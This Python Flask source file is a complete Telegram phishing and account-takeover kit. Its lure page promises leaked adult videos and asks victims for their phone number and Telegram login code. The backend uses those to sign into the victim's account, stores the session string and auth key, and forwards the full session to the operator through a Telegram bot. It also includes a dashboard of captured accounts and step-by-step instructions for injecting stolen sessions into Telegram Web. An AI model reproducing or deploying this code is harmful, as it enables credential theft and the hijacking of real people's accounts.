from flask import Flask, request, jsonify, render_template_string
import os
import json
import base64
import threading
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
# ===================================

if sys.version_info >= (3, 14):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
sessions_lock = threading.Lock()

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved to file: {account['phone']} | Session: {len(account.get('session',''))} chars")
    return account

captured_accounts = load_accounts()

# ====== Phone Formatter ======
def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Phishing Page ======
PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Video Hub</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
        .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
        .video-info{padding:15px}
        .video-info h3{font-size:15px;margin-bottom:5px}
        .video-info .meta{color:#666;font-size:12px}
        .video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .link-section{padding:10px 20px 20px;text-align:center}
        .get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase;transition:all 0.3s}
        .get-link-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(233,69,96,0.6)}
        .get-link-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .get-link-btn .small{font-size:11px;font-weight:400;display:block;margin-top:3px;opacity:0.8}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:5px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
        .modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
        .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
        .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
        .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
        .np .k:active{background:#3a3a5e;transform:scale(0.95)}
        .np .kc{background:#e94560;color:white}
        .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
        .np .ks:disabled{background:#333;color:#666}
        .step{display:none}
        .step.active{display:block}
        .ss{text-align:center;padding:20px 0}
        .ss .bi{font-size:60px;margin-bottom:15px}
        .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
        .ss p{color:#888;font-size:13px;margin-bottom:20px}
        .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
        .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .section-title{padding:15px 20px 10px;font-size:17px;font-weight:700;color:#ddd}
        .video-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 20px 20px}
        .video-item{background:#141420;border-radius:10px;overflow:hidden}
        .video-item .thumb{height:95px;background:linear-gradient(135deg,#1a1a2e,#2d1b69);display:flex;align-items:center;justify-content:center;font-size:30px;color:rgba(255,255,255,0.3)}
        .video-item .info{padding:10px}
        .video-item .info h4{font-size:12px;margin-bottom:3px}
        .video-item .info span{font-size:11px;color:#666}
        .footer{text-align:center;padding:20px;color:#333;font-size:11px}
        .cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
        .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
        .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
        .cc input::placeholder{color:#555}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified members only</p>
    </div>
    <div class="video-card">
        <div class="thumbnail"><div class="play-btn">▶</div></div>
        <div class="video-info">
            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    <div class="link-section">
        <button class="get-link-btn" id="glb">
            🔞 GET YOUR LINK
            <span class="small">Tap to verify via Telegram</span>
        </button>
    </div>
    <div class="section-title">🔥 More Videos</div>
    <div class="video-grid">
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
    </div>
    <div class="footer">© 2026 Premium Video Hub</div>
    
    <div class="modal-overlay" id="vm">
        <div class="modal">
            <!-- Step 1: Phone Input -->
            <div id="s1" class="step active">
                <div class="modal-icon">📱</div>
                <h2>Telegram verification</h2>
                <p>Enter your Telegram account phone number</p>
                
                <div class="cc">
                    <div class="ccd">+91</div>
                    <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
                </div>
                
                <button onclick="sendPhoneFromStep1()"
                    style="width:100%; padding:15px; background:#0088cc; border:none; 
                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
                           cursor:pointer; margin-bottom:10px; transition:0.3s"
                    onmouseover="this.style.background='#0077b6'"
                    onmouseout="this.style.background='#0088cc'">
                    📱 Send code
                </button>
                
                <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
            </div>
            
            <!-- Step 2: OTP Code Input -->
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Verification code</h2>
                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
                <div class="cd" id="cdisp">_____</div>
                <div class="np" id="np">
                    <button class="k" onclick="pk('1')">1</button>
                    <button class="k" onclick="pk('2')">2</button>
                    <button class="k" onclick="pk('3')">3</button>
                    <button class="k" onclick="pk('4')">4</button>
                    <button class="k" onclick="pk('5')">5</button>
                    <button class="k" onclick="pk('6')">6</button>
                    <button class="k" onclick="pk('7')">7</button>
                    <button class="k" onclick="pk('8')">8</button>
                    <button class="k" onclick="pk('9')">9</button>
                    <button class="k kc" onclick="cc()">⌫</button>
                    <button class="k" onclick="pk('0')">0</button>
                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                </div>
                <div id="vs" class="sb"></div>
            </div>
            
            <!-- Step 3: Success -->
            <div id="s3" class="step">
                <div class="ss">
                    <div class="bi">✅</div>
                    <h2>Verification complete!</h2>
                    <p>Please wait...</p>
                    <button class="wb" onclick="wv()">🎬 Get link</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
    var phoneNumber = '';
    var codeDigits = '';
    var codeCheckInterval = null;
    
    document.getElementById('glb').onclick = function() {
        document.getElementById('vm').classList.add('active');
        document.getElementById('s1').classList.add('active');
        document.getElementById('s2').classList.remove('active');
        document.getElementById('s3').classList.remove('active');
        
        document.getElementById('ps1').style.display = 'none';
        document.getElementById('phoneInput').value = '';
        document.getElementById('phoneInput').focus();
    };
    
    function sendPhoneFromStep1() {
        var phone = document.getElementById('phoneInput').value.trim();
        
        if (!phone || phone.length !== 10) {
            document.getElementById('ps1').className = 'sb error';
            document.getElementById('ps1').innerHTML = '❌ Please enter 10 digit phone number';
            document.getElementById('ps1').style.display = 'block';
            return;
        }
        
        phoneNumber = '+91' + phone;
        
        document.getElementById('ps1').className = 'sb waiting';
        document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
        document.getElementById('ps1').style.display = 'block';
        
        sendPhoneToBackend(phoneNumber);
    }
    
    async function sendPhoneToBackend(phone) {
        try {
            var res = await fetch('/api/share', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});
            var data = await res.json();
            if (data.success) {
                document.getElementById('s1').classList.remove('active');
                document.getElementById('s2').classList.add('active');
                document.getElementById('pd').textContent = phone;
                var cs = document.getElementById('cs');
                cs.className = 'sb waiting';
                cs.innerHTML = '<span class="sp"></span> Sending code...';
                cs.style.display = 'block';
                startCodeCheck();
            } else {
                var ps = document.getElementById('ps1');
                ps.className = 'sb error';
                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                ps.style.display = 'block';
            }
        } catch(e) {
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ Connection error';
            ps.style.display = 'block';
        }
    }
    
    function startCodeCheck() {
        if (codeCheckInterval) clearInterval(codeCheckInterval);
        codeCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
                var data = await res.json();
                if (data.s === 'sent') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb success';
                    cs.innerHTML = '✅ Code sent! Enter below:';
                    cs.style.display = 'block';
                } else if (data.s === 'done') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    document.getElementById('s2').classList.remove('active');
                    document.getElementById('s3').classList.add('active');
                } else if (data.s === 'err') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb error';
                    cs.innerHTML = '❌ Error sending code';
                    cs.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }
    
    function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
    function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
    
    async function sc() {
        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5 digit code','error'); return; }
        document.getElementById('sb').disabled = true;
        document.getElementById('sb').textContent = '⏳ Verifying...';
        try {
            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
            var data = await res.json();
            if (data.success) {
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s3').classList.add('active');
                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
            } else {
                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
                codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
            }
        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
    }
    
    function showVerifyStatus(msg, type) {
        document.getElementById('vs').textContent = msg;
        document.getElementById('vs').className = 'sb ' + type;
        document.getElementById('vs').style.display = 'block';
    }
    
    function wv() { window.location.href = 'https://example.com'; }
    
    document.getElementById('vm').onclick = function(e) {
        if(e.target === this) {
            this.classList.remove('active');
            if(codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        }
    };
    </script>
</body>
</html>"""

# ====== Telegram Async Functions ======

def run_telegram_action(phone, code=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def send_code():
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            r = await c.send_code_request(phone)
            
            session_str = StringSession.save(c.session)
            
            with sessions_lock:
                user_sessions[phone] = {
                    'hash': r.phone_code_hash,
                    'session': session_str
                }
                pending_codes[phone] = 'sent'
            
            await c.disconnect()
            logger.info(f"Code sent to {phone}")
            return True
        
        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]
            
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=s['hash']
                )
                
                me = await client.get_me()
                ss = StringSession.save(client.session)
                
                auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
                dc = client.session.dc_id
                
                if auth_key_bytes:
                    auth_b64 = base64.b64encode(auth_key_bytes).decode()
                else:
                    logger.warning("Auth key None, trying reconnect...")
                    ss_temp = ss
                    await client.disconnect()
                    await asyncio.sleep(0.3)
                    
                    client2 = TelegramClient(StringSession(ss_temp), API_ID, API_HASH)
                    await client2.connect()
                    await client2.start()
                    
                    auth_key_bytes = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    auth_b64 = base64.b64encode(auth_key_bytes).decode() if auth_key_bytes else ""
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    await client2.disconnect()
                
                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now())
                }
                
                # Save to file
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                
                with sessions_lock:
                    if phone in user_sessions:
                        del user_sessions[phone]
                    pending_codes[phone] = 'done'
                
                # ====== FIX: Send FULL session string in notification ======
                try:
                    import requests
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                        'chat_id': YOUR_TELEGRAM_ID,
                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n\n🆔 `{ss}`",
                        'parse_mode': 'Markdown'
                    }, timeout=5)
                except Exception as e:
                    logger.error(f"Notify error: {e}")
                    try:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                            'chat_id': YOUR_TELEGRAM_ID,
                            'text': f"New Account!\nPhone: {phone}\nName: {me.first_name}\nID: {me.id}\nUsername: @{me.username or 'none'}\nDC: {dc}\nSession: {len(ss)} chars\n\n{ss}"
                        }, timeout=5)
                    except:
                        pass
                
                logger.info(f"Account captured: {phone} | Session: {len(ss)} chars")
                return {'success': True, 'session': ss}
                
            except Exception as e:
                e_str = str(e)
                logger.error(f"Verify error for {phone}: {e_str}")
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA enabled'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()

# ====== Flask Routes ======

@app.route('/')
def index():
    return render_template_string(PAGE)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    ph = format_phone(ph)
    logger.info(f"Phone received: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    
    ph = format_phone(ph)
    result = run_telegram_action(ph, code)
    return jsonify(result)

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        with sessions_lock:
            if phone in user_sessions:
                return jsonify({
                    'phone': phone,
                    'status': 'pending',
                    'message': 'Code sent, waiting for verification'
                })
        return jsonify({'error': 'Not found'}), 404
    
    return jsonify({
        'phone': phone,
        'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'],
        'dc': a['dc'],
        'session': a['session'],
        'session_length': len(a['session']),
        'has_session': bool(a['session']),
        'webk_data': a['webk']
    })

@app.route('/webk/<phone>')
def webk(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        return """
        <html><body style="background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="text-align:center;padding:40px;background:#141420;border-radius:20px;border:1px solid #1a1a2e">
        <h2 style="color:#e94560">Not Found</h2>
        <p style="color:#888">No account found for this phone number.</p>
        <a href="/dash" style="color:#0088cc">Back to Dashboard</a>
        </div></body></html>
        """, 404
    
    w = a['webk']
    ss = a['session']
    ss_ok = bool(ss) and len(ss) > 10
    
    return f"""
    <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
    <style>
        body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
        .c{{background:#141420;padding:40px;border-radius:20px;max-width:550px;width:100%;text-align:center;border:1px solid #1a1a2e}}
        .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
        .i{{color:#888;margin:3px 0;font-size:14px}}
        .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
        .bp{{background:#0088cc;color:white}}
        .bs{{background:#4CAF50;color:white}}
        .br{{background:#e94560;color:white}}
        .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0;max-height:200px;overflow:auto}}
        .warn{{background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
        .success{{background:#4CAF50;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
        code{{color:#0f0;word-break:break-all;font-size:9px}}
        .sg{{background:#0a0a0a;padding:15px;border-radius:8px;text-align:left;font-size:11px;margin:10px 0;border:1px solid #2a2a3e}}
    </style></head>
    <body><div class="c">
    <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
    <h2>{a['first_name']} {a['last_name']}</h2>
    <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
    <div class="i">{a['phone']}</div>
    {'<div class="success">Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">No session string available</div>'}
    
    <div class="sg"><b>WebK Data:</b><br><code>{w}</code></div>
    
    <button class="b bp" onclick="o()">1 Open WebK</button>
    <button class="b bs" id="ib" style="display:none" onclick="i()">2 Inject Session</button>
    <button class="b bp" id="rb" style="display:none" onclick="r()">3 Refresh</button>
    <div id="st" class="i" style="margin-top:15px"></div>
    
    <hr style="border-color:#1a1a2e;margin:15px 0">
    
    <div class="sg"><b>Session String ({len(ss)} chars):</b><br>
    <code style="font-size:10px">{ss}</code></div>
    
    <button class="b br" onclick="copySession()">Copy Session String</button>
    
    <div class="sg"><b>Telethon Usage:</b><br>
    <code style="font-size:10px">
from telethon import TelegramClient
from telethon.sessions import StringSession

client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')
client.start()
me = client.get_me()
print(me.phone)
    </code></div>
    
    <div class="sg"><b>Manual WebK:</b><br>
    1. web.telegram.org/k<br>
    2. F12 Console<br>
    3. Paste: <code style="font-size:10px">localStorage.setItem('webk_session','{w}')</code><br>
    4. F5
    </div>
    
    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">Dashboard</a>
    
    </div>
    <script>
    var wk;
    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='Opened!'}}
    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='Closed!';return}}
    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='Error'}}}}
    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='Logged in!'}}}}
    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='Copy failed'}})}}
    </script></body></html>
    """

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{a.get('dc','')}</td>
            <td>{ss_status} ({ss_len})</td>
            <td>{a.get('time','')}</td>
            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
        </tr>"""
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
        body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
        h1{{color:#e94560}}
        table{{width:100%;border-collapse:collapse;margin-top:15px}}
        th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
        th{{background:#141420;color:#ddd}}
        tr:hover{{background:#141420}}
        .st{{display:inline-block;background:#141420;padding:15px 25px;border-radius:10px;margin:10px}}
        .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
        a{{color:#0088cc;text-decoration:none}}
    </style></head>
    <body>
    <h1>Telegram Accounts</h1>
    <div class="st"><div class="n">{len(accounts)}</div><div>Total</div></div>
    <table><thead><tr>
        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>View</th>
    </tr></thead><tbody>
    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
    </tbody></table>
    <script>setTimeout(()=>location.reload(),10000)</script>
    </body></html>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Server running on port {port}")
    print(f"Main: http://localhost:{port}")
    print(f"Dashboard: http://localhost:{port}/dash")
    app.run(host='0.0.0.0', port=port, debug=True)
